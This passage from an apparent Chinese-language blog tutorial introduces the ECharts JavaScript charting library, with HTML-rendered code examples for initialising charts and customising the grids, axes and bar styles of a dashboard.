class="number">0</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">10.125rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> rotate&#123;</span><br><span class="line"><span class="selector-tag">from</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>,-<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">to</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>,-<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">360deg</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> rotate1&#123;</span><br><span class="line"><span class="selector-tag">from</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">to</span> &#123;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(-<span class="number">360deg</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ECharts"><a href="#ECharts" class="headerlink" title="ECharts"></a>ECharts</h1><blockquote><p>这一节的教程也是基于b站<a href="https://www.bilibili.com/video/BV1v7411R7mp" target="_blank" rel="noopener">pink老师</a>的教程进行记录的，感兴趣的可以点过去学习一波</p></blockquote><p>常见的数据可视化库：</p><ul><li>D3.js   目前 Web 端评价最高的 Javascript 可视化工具库(入手难)  </li><li>ECharts.js   百度出品的一个开源 Javascript 数据可视化库   </li><li>Highcharts.js  国外的前端数据可视化库，非商用免费，被许多国外大公司所使用  </li><li>AntV  蚂蚁金服全新一代数据可视化解决方案  等等</li><li>Highcharts 和 Echarts 就像是 Office 和 WPS 的关系</li></ul><blockquote><p>ECharts，一个使用 JavaScript 实现的开源可视化库，可以流畅的运行在 PC 和移动设备上，兼容当前绝大部分浏览器（IE8/9/10/11，Chrome，Firefox，Safari等），底层依赖矢量图形库 <a href="https://github.com/ecomfe/zrender" target="_blank" rel="noopener">ZRender</a>，提供直观，交互丰富，可高度个性化定制的数据可视化图表。</p></blockquote><p>简单理解</p><ul><li>是一个JS插件</li><li>性能好可流畅运行PC与移动设备</li><li>兼容主流浏览器</li><li>提供很多常用图表，且可<strong>定制</strong>。<ul><li><a href="https://www.echartsjs.com/zh/option.html#series-line" target="_blank" rel="noopener">折线图</a>、<a href="https://www.echartsjs.com/zh/option.html#series-bar" target="_blank" rel="noopener">柱状图</a>、<a href="https://www.echartsjs.com/zh/option.html#series-scatter" target="_blank" rel="noopener">散点图</a>、<a href="https://www.echartsjs.com/zh/option.html#series-pie" target="_blank" rel="noopener">饼图</a>、<a href="https://www.echartsjs.com/zh/option.html#series-candlestick" target="_blank" rel="noopener">K线图</a></li></ul></li></ul><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><p>下载地址：<a href="https://www.echartsjs.com/zh/index.html" target="_blank" rel="noopener">https://www.echartsjs.com/zh/index.html</a></p><ol><li>引入echarts 插件文件到html页面中(<strong>🔺注意：引入的Echarts的js文件必须在arcgis前面</strong>)</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"js/echarts.min.js"</span>&gt; &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>准备一个具备宽度和高度的DOM容器</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">style</span>=<span class="string">"width: 600px;height:400px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>初始化echarts实例对象</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.getElementById(<span class="string">'main'</span>));</span><br></pre></td></tr></table></figure><ol start="4"><li>指定配置项和数据(option)</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> option = &#123;</span><br><span class="line">    xAxis: &#123;</span><br><span class="line">        type: <span class="string">'category'</span>,</span><br><span class="line">        data: [<span class="string">'Mon'</span>, <span class="string">'Tue'</span>, <span class="string">'Wed'</span>, <span class="string">'Thu'</span>, <span class="string">'Fri'</span>, <span class="string">'Sat'</span>, <span class="string">'Sun'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    yAxis: &#123;</span><br><span class="line">        type: <span class="string">'value'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    series: [&#123;</span><br><span class="line">        data: [<span class="number">820</span>, <span class="number">932</span>, <span class="number">901</span>, <span class="number">934</span>, <span class="number">1290</span>, <span class="number">1330</span>, <span class="number">1320</span>],</span><br><span class="line">        type: <span class="string">'line'</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="5"><li>将配置项设置给echarts实例对象</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myChart.setOption(option);</span><br></pre></td></tr></table></figure><h2 id="常用对象"><a href="#常用对象" class="headerlink" title="常用对象"></a>常用对象</h2><blockquote><p><code>series</code> <code>xAxis</code> <code>yAxis</code> <code>grid</code> <code>tooltip</code> <code>title</code> <code>legend</code> <code>color</code> </p></blockquote><ul><li><p>series</p><ul><li>系列列表。每个系列通过 <code>type</code> 决定自己的图表类型</li><li>图标数据，指定什么类型的图表，可以多个图表重叠。</li></ul></li><li><p>xAxis：直角坐标系 grid 中的 x 轴</p><ul><li>boundaryGap: 坐标轴两边留白策略 true，这时候刻度只是作为分隔线，标签和数据点都会在两个刻度之间的带(band)中间。</li></ul></li><li><p>yAxis：直角坐标系 grid 中的 y 轴</p></li><li><p>grid：直角坐标系内绘图网格。 </p></li><li><p>title：标题组件</p></li><li><p>tooltip：提示框组件</p></li><li><p>legend：图例组件</p></li><li><p>color：调色盘颜色列表</p><p>数据堆叠，同个类目轴上系列配置相同的<code>stack</code>值后 后一个系列的值会在前一个系列的值上相加。</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">option = &#123;</span><br><span class="line">    <span class="comment">// color设置我们线条的颜色 注意后面是个数组</span></span><br><span class="line">    color: [<span class="string">'pink'</span>, <span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'skyblue'</span>],</span><br><span class="line">    <span class="comment">// 设置图表的标题</span></span><br><span class="line">    title: &#123;</span><br><span class="line">        text: <span class="string">'折线图堆叠123'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 图表的提示框组件 </span></span><br><span class="line">    tooltip: &#123;</span><br><span class="line">        <span class="comment">// 触发方式</span></span><br><span class="line">        trigger: <span class="string">'axis'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 图例组件</span></span><br><span class="line">    legend: &#123;</span><br><span class="line">       <span class="comment">// series里面有了 name值则 legend里面的data可以删掉</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 网格配置  grid可以控制线形图 柱状图 图表大小</span></span><br><span class="line">    grid: &#123;</span><br><span class="line">        left: <span class="string">'3%'</span>,</span><br><span class="line">        right: <span class="string">'4%'</span>,</span><br><span class="line">        bottom: <span class="string">'3%'</span>,</span><br><span class="line">        <span class="comment">// 是否显示刻度标签 如果是true 就显示 否则反之</span></span><br><span class="line">        containLabel: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 工具箱组件  可以另存为图片等功能</span></span><br><span class="line">    toolbox: &#123;</span><br><span class="line">        feature: &#123;</span><br><span class="line">            saveAsImage: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 设置x轴的相关配置</span></span><br><span class="line">    xAxis: &#123;</span><br><span class="line">        type: <span class="string">'category'</span>,</span><br><span class="line">        <span class="comment">// 是否让我们的线条和坐标轴有缝隙</span></span><br><span class="line">        boundaryGap: <span class="literal">false</span>,</span><br><span class="line">        data: [<span class="string">'星期一'</span>, <span class="string">'周二'</span>, <span class="string">'周三'</span>, <span class="string">'周四'</span>, <span class="string">'周五'</span>, <span class="string">'周六'</span>, <span class="string">'周日'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">     <span class="comment">// 设置y轴的相关配置</span></span><br><span class="line">    yAxis: &#123;</span><br><span class="line">        type: <span class="string">'value'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 系列图表配置 它决定着显示那种类型的图表</span></span><br><span class="line">    series: [</span><br><span class="line">        &#123;</span><br><span class="line">            name: <span class="string">'邮件营销'</span>,</span><br><span class="line">            type: <span class="string">'line'</span>,</span><br><span class="line">           </span><br><span class="line">            data: [<span class="number">120</span>, <span class="number">132</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            name: <span class="string">'联盟广告'</span>,</span><br><span class="line">            type: <span class="string">'line'</span>,</span><br><span class="line"></span><br><span class="line">            data: [<span class="number">220</span>, <span class="number">182</span>, <span class="number">191</span>, <span class="number">234</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            name: <span class="string">'视频广告'</span>,</span><br><span class="line">            type: <span class="string">'line'</span>,</span><br><span class="line">          </span><br><span class="line">            data: [<span class="number">150</span>, <span class="number">232</span>, <span class="number">201</span>, <span class="number">154</span>, <span class="number">190</span>, <span class="number">330</span>, <span class="number">410</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            name: <span class="string">'直接访问'</span>,</span><br><span class="line">            type: <span class="string">'line'</span>,</span><br><span class="line">          </span><br><span class="line">            data: [<span class="number">320</span>, <span class="number">332</span>, <span class="number">301</span>, <span class="number">334</span>, <span class="number">390</span>, <span class="number">330</span>, <span class="number">320</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="项目正式使用"><a href="#项目正式使用" class="headerlink" title="项目正式使用"></a>项目正式使用</h2><ol><li><p>使用立即执行函数制作各个表格模块</p><p>立即执行函数优点：</p><ul><li>不必为函数命名，避免了污染全局变量</li><li>立即执行函数内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量</li><li>封装变量</li></ul></li><li><p>每个要制作图表的dom容器必须指定长宽</p></li></ol><h2 id="左上柱状图"><a href="#左上柱状图" class="headerlink" title="左上柱状图"></a>左上柱状图</h2><ul><li><p>官网找到类似实例， 适当分析，并且引入到HTML页面中</p></li><li><p>根据需求定制图表</p><ol><li><p>修改图表柱形颜色</p></li><li><p>修改图表大小  top 为 10px   bottom 为  4%    grid决定我们的柱状图的大小</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">color: [<span class="string">"#2f89cf"</span>],</span><br><span class="line">     grid: &#123;</span><br><span class="line">       left: <span class="string">"0%"</span>,</span><br><span class="line">       top: <span class="string">"10px"</span>,</span><br><span class="line">       right: <span class="string">"0%"</span>,</span><br><span class="line">       bottom: <span class="string">"4%"</span>,</span><br><span class="line">       containLabel: <span class="literal">true</span> <span class="comment">//是否将文字标注也算进去</span></span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure></li><li><p>X轴相关设置  xAxis</p><ul><li>文本颜色设置为   rgba(255,255,255,.6)   字体大小为 12px</li><li>X轴线的样式 不显示</li><li>修改data为自己的数据</li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// X轴</span></span><br><span class="line">xAxis: [&#123;</span><br><span class="line">    type: <span class="string">"category"</span>, <span class="comment">//X轴类型</span></span><br><span class="line">    data: [</span><br><span class="line">        <span class="string">"湖北"</span>,</span><br><span class="line">        <span class="string">"广东"</span>,</span><br><span class="line">        <span class="string">"江西"</span>,</span><br><span class="line">        <span class="string">"北京"</span>,</span><br><span class="line">        <span class="string">"上海"</span>,</span><br><span class="line">        <span class="string">"河北"</span>,</span><br><span class="line">        <span class="string">"浙江"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">//刻度</span></span><br><span class="line">    axisTick: &#123;</span><br><span class="line">        alignWithLabel: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//刻度标签</span></span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        textStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">            fontSize: <span class="string">'12'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//刻度线</span></span><br><span class="line">    axisLine: &#123;</span><br><span class="line">        show: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><ol start="4"><li><p>Y 轴相关定制</p><ul><li>文本颜色设置为   rgba(255,255,255,.6)   字体大小为 12px</li><li>Y 轴线条样式 更改为  1像素的  rgba(255,255,255,.1) 边框</li><li>分隔线的颜色修饰为  1像素的  rgba(255,255,255,.1)  </li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">yAxis: [&#123;</span><br><span class="line">    type: <span class="string">"value"</span>,</span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        textStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">            fontSize: <span class="string">'12'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    axisLine: &#123;</span><br><span class="line">        lineStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">            <span class="comment">// width: 1,</span></span><br><span class="line">            <span class="comment">// type: "solid"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    splitLine: &#123;</span><br><span class="line">        lineStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><ol start="5"><li>修改柱形为圆角以及柱子宽度  series 里面设置 添加数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图表中心内容</span></span><br><span class="line">series: [&#123;</span><br><span class="line">    name: <span class="string">"直接访问"</span>,</span><br><span class="line">    type: <span class="string">"bar"</span>,</span><br><span class="line">    barWidth: <span class="string">"35%"</span>,</span><br><span class="line">    <span class="comment">// fontSize: '8',</span></span><br><span class="line">    data: [<span class="number">200</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">900</span>, <span class="number">1500</span>, <span class="number">1200</span>, <span class="number">600</span>],</span><br><span class="line">    itemStyle: &#123;</span><br><span class="line">        barBorderRadius: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><ol start="6"><li>让图表跟随屏幕自适应</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//图表跟随屏幕自适应</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><ol start="7"><li>完整代码</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//左上模块</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//初识化ECharts</span></span><br><span class="line">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.querySelector(<span class="string">".bar .chart"</span>));</span><br><span class="line">    <span class="comment">//指定配置项和数据</span></span><br><span class="line">    <span class="keyword">var</span> option = &#123;</span><br><span class="line">        color: [<span class="string">"#2f89cf"</span>],</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: <span class="string">"axis"</span>,</span><br><span class="line">            axisPointer: &#123;</span><br><span class="line">                <span class="comment">// 坐标轴指示器，坐标轴触发有效</span></span><br><span class="line">                type: <span class="string">"shadow"</span> <span class="comment">// 默认为直线，可选为：'line' | 'shadow'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        grid: &#123;</span><br><span class="line">            left: <span class="string">"0%"</span>,</span><br><span class="line">            top: <span class="string">"10px"</span>,</span><br><span class="line">            right: <span class="string">"0%"</span>,</span><br><span class="line">            bottom: <span class="string">"4%"</span>,</span><br><span class="line">            containLabel: <span class="literal">true</span> <span class="comment">//是否将文字标注也算进去</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// X轴</span></span><br><span class="line">        xAxis: [&#123;</span><br><span class="line">            type: <span class="string">"category"</span>, <span class="comment">//X轴类型</span></span><br><span class="line">            data: [</span><br><span class="line">                <span class="string">"湖北"</span>,</span><br><span class="line">                <span class="string">"广东"</span>,</span><br><span class="line">                <span class="string">"江西"</span>,</span><br><span class="line">                <span class="string">"北京"</span>,</span><br><span class="line">                <span class="string">"上海"</span>,</span><br><span class="line">                <span class="string">"河北"</span>,</span><br><span class="line">                <span class="string">"浙江"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="comment">//刻度</span></span><br><span class="line">            axisTick: &#123;</span><br><span class="line">                alignWithLabel: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//刻度标签</span></span><br><span class="line">            axisLabel: &#123;</span><br><span class="line">                textStyle: &#123;</span><br><span class="line">                    color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">                    fontSize: <span class="string">'12'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//刻度线</span></span><br><span class="line">            axisLine: &#123;</span><br><span class="line">                show: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="comment">// y轴</span></span><br><span class="line">        yAxis: [&#123;</span><br><span class="line">            type: <span class="string">"value"</span>,</span><br><span class="line">            axisLabel: &#123;</span><br><span class="line">                textStyle: &#123;</span><br><span class="line">                    color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">                    fontSize: <span class="string">'12'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            axisLine: &#123;</span><br><span class="line">                lineStyle: &#123;</span><br><span class="line">                    color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">                    <span class="comment">// width: 1,</span></span><br><span class="line">                    <span class="comment">// type: "solid"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            splitLine: &#123;</span><br><span class="line">                lineStyle: &#123;</span><br><span class="line">                    color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="comment">//图表中心内容</span></span><br><span class="line">        series: [&#123;</span><br><span class="line">            name: <span class="string">"直接访问"</span>,</span><br><span class="line">            type: <span class="string">"bar"</span>,</span><br><span class="line">            barWidth: <span class="string">"35%"</span>,</span><br><span class="line">            <span class="comment">// fontSize: '8',</span></span><br><span class="line">            data: [<span class="number">200</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">900</span>, <span class="number">1500</span>, <span class="number">1200</span>, <span class="number">600</span>],</span><br><span class="line">            itemStyle: &#123;</span><br><span class="line">                barBorderRadius: <span class="number">5</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//配置项设置给ECarts实例对象</span></span><br><span class="line">    myChart.setOption(option);</span><br><span class="line">    <span class="comment">//图表跟随屏幕自适应</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="柱状图2定制"><a href="#柱状图2定制" class="headerlink" title="柱状图2定制"></a>柱状图2定制</h2><ul><li>官网找到类似实例， 适当分析，并且引入到HTML页面中</li><li>根据需求定制图表</li></ul><p>需求1： 修改图形大小 grid</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 图标位置</span></span><br><span class="line">      grid: &#123;</span><br><span class="line">          top: <span class="string">"10%"</span>,</span><br><span class="line">          left: <span class="string">"22%"</span>,</span><br><span class="line">          bottom: <span class="string">"10%"</span></span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure><p>需求2： 不显示x轴 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xAxis: &#123;</span><br><span class="line">    show: <span class="literal">false</span> <span class="comment">//取消显示x轴（包括竖线）</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>需求3： y轴相关定制</p><ul><li><p>不显示y轴轴线和相关刻度</p></li><li><p>y轴文字的颜色设置为白色</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//y轴</span></span><br><span class="line">yAxis: [&#123;</span><br><span class="line">        show: <span class="literal">true</span>, <span class="comment">//显示y轴</span></span><br><span class="line">        data: titlename, <span class="comment">//类目数据</span></span><br><span class="line">        inverse: <span class="literal">true</span>, <span class="comment">//反向坐标轴</span></span><br><span class="line">        axisLine: &#123; <span class="comment">//坐标轴线</span></span><br><span class="line">            show: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        splitLine: &#123; <span class="comment">//分割线</span></span><br><span class="line">            show: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        axisTick: &#123; <span class="comment">//坐标轴刻度</span></span><br><span class="line">            show: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        axisLabel: &#123;</span><br><span class="line">            color: <span class="string">"#fff"</span>, <span class="comment">//标注字体颜色    </span></span><br><span class="line">            rich: &#123; <span class="comment">//富文本样式</span></span><br><span class="line">                lg: &#123;</span><br><span class="line">                    backgroundColor: <span class="string">"#391"</span>,</span><br><span class="line">                    color: <span class="string">"#fff"</span>,</span><br><span class="line">                    borderRadius: <span 